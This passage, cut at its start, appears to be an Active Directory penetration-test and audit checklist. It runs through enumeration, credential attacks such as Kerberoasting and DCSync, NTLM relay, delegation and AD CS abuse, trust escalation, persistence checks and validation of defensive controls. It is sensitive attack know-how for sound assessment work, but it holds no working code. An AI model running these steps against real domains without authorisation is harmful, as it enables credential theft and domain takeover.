- [ ] Map trust relationships (inter-domain, inter-forest)
- [ ] Enumerate users, groups, OUs, GPOs via LDAP
- [ ] Run BloodHound/SharpHound collection (All, Session, LoggedOn)
- [ ] Identify privileged accounts (DA, EA, Schema Admins, Account Operators)
- [ ] Enumerate AdminCount=1 users (protected accounts)
- [ ] Enumerate computer objects and operating systems
- [ ] Identify service accounts (accounts with SPNs)
- [ ] Check for stale/disabled accounts with privileged group membership
- [ ] Enumerate DNS zones and records
- [ ] Identify dual-homed hosts and network segmentation

### Phase 2: Credential Attacks

- [ ] Kerberoast all user accounts with SPNs — crack offline
- [ ] AS-REP Roast accounts with DONT_REQ_PREAUTH
- [ ] Check SYSVOL for GPP passwords (Groups.xml, etc.)
- [ ] Check for cleartext credentials in SYSVOL scripts
- [ ] Check for credentials in NETLOGON share
- [ ] Test for password spraying (respect lockout policy)
- [ ] Check for password reuse across accounts
- [ ] Enumerate LAPS — can any non-admin read LAPS passwords?
- [ ] Check for gMSA password readability
- [ ] Extract DPAPI backup keys if DA achieved
- [ ] Attempt DCSync if replication rights obtained
- [ ] Check for cached credentials on compromised hosts

### Phase 3: Configuration & Protocol Weaknesses

- [ ] Check SMB signing enforcement across all hosts
- [ ] Check LDAP signing and channel binding enforcement
- [ ] Check for LLMNR/NBT-NS/mDNS broadcast protocols (Responder)
- [ ] Check for WebClient service (WebDAV) on hosts
- [ ] Check for Print Spooler service on DCs and servers
- [ ] Test for NTLM relay paths (SMB→LDAP, HTTP→LDAP, etc.)
- [ ] Enumerate MachineAccountQuota (default 10)
- [ ] Check for NTLM authentication allowed on DCs
- [ ] Check for NTLMv1 allowed (LmCompatibilityLevel)
- [ ] Verify Kerberos pre-authentication enforcement

### Phase 4: Delegation Audit

- [ ] Enumerate unconstrained delegation (non-DC computers)
- [ ] Enumerate constrained delegation (msDS-AllowedToDelegateTo)
- [ ] Enumerate RBCD configurations (msDS-AllowedToActOnBehalfOfOtherIdentity)
- [ ] Test S4U2Self/S4U2Proxy abuse for each delegation config
- [ ] Check for protocol transition (TrustedToAuthForDelegation)
- [ ] Test SPN rewriting for constrained delegation targets
- [ ] Verify Protected Users group membership blocks delegation

### Phase 5: ACL & Object Security

- [ ] Analyze BloodHound attack paths for ACL abuse chains
- [ ] Check for GenericAll/GenericWrite on high-value objects
- [ ] Check for WriteDACL/WriteOwner on domain root, DCs, privileged groups
- [ ] Check for DS-Replication rights on non-DC accounts
- [ ] Verify AdminSDHolder ACL integrity
- [ ] Check for ForceChangePassword rights on privileged accounts
- [ ] Audit msDS-KeyCredentialLink write permissions (Shadow Credentials)
- [ ] Check for AddMember rights on privileged groups
- [ ] Verify GPO edit permissions (GPO takeover → code execution)

### Phase 6: AD Certificate Services (AD CS)

- [ ] Enumerate all Enterprise CAs and certificate templates
- [ ] Run Certify/certipy find /vulnerable for ESC1-ESC14
- [ ] Check for ENROLLEE_SUPPLIES_SUBJECT on auth-enabled templates (ESC1)
- [ ] Check for Any Purpose / No EKU templates (ESC2)
- [ ] Check for Enrollment Agent templates (ESC3)
- [ ] Audit template ACLs (ESC4)
- [ ] Check PKI object ACLs (NTAuthCertificates, CA object) (ESC5)
- [ ] Check EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA (ESC6)
- [ ] Audit CA ACLs for ManageCA/ManageCertificates (ESC7)
- [ ] Test for NTLM relay to HTTP/RPC enrollment (ESC8/ESC11)
- [ ] Check StrongCertificateBindingEnforcement registry value (ESC9/ESC10)
- [ ] Verify CA private key protection (HSM vs DPAPI) (ESC12)
- [ ] Check for OID Group Link configurations (ESC13)
- [ ] Audit altSecurityIdentities write permissions (ESC14)
- [ ] Verify web enrollment and CES EPA configuration

### Phase 7: Trust & Cross-Domain

- [ ] Map all trust relationships and directions
- [ ] Check SID Filtering status on each trust
- [ ] Test Kerberoasting across trusts
- [ ] Check for shared credentials across trusted domains/forests
- [ ] Test child-to-parent escalation (Golden Ticket + SID History)
- [ ] Enumerate foreign group membership
- [ ] Check for AD CS trust configurations (cross-forest enrollment)

### Phase 8: Persistence Verification

- [ ] Check for rogue SPNs on user accounts
- [ ] Verify AdminSDHolder ACL for backdoor ACEs
- [ ] Check for unexpected DCSync rights
- [ ] Audit krbtgt password last set date
- [ ] Check for Golden/Silver/Diamond Ticket artifacts
- [ ] Verify DSRM password configuration (DsrmAdminLogonBehavior)
- [ ] Check for Skeleton Key artifacts in LSASS
- [ ] Audit Security Packages registry key for custom SSPs
- [ ] Check for long-lived certificates issued to user accounts
- [ ] Verify GPO integrity (compare against known-good baseline)
- [ ] Check SID History on all accounts for injected SIDs

### Phase 9: Defensive Controls Validation

- [ ] Verify Protected Users group usage for privileged accounts
- [ ] Check for Credential Guard deployment on sensitive hosts
- [ ] Verify LAPS deployment and configuration (Legacy + v2)
- [ ] Verify gMSA usage for service accounts
- [ ] Check for tiered administration model implementation
- [ ] Verify PAC validation enforcement (KB5008380+)
- [ ] Audit Kerberos encryption types allowed (disable RC4 where possible)
- [ ] Check for Microsoft Defender for Identity (MDI) deployment
- [ ] Verify audit policy configuration against checklist
- [ ] Check for privileged access workstations (PAWs)
